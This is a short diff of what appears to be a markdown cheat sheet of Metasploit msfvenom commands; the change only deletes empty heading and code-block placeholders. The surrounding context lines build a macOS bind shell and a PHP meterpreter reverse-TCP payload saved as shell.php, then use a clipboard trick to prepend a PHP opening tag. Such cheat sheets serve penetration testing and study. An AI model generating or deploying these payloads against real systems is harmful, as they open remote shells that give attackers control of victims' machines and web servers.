@@ -79,18 +79,3 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST={IP}  LPORT={Port} -f macho > {nomefile
 msfvenom -p php/meterpreter_reverse_tcp LHOST={IP}  LPORT={Port}  -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
-
-### 
-```bash
-
-```
-
-### 
-```bash
-
-```
-
-### 
-```bash
-
-```
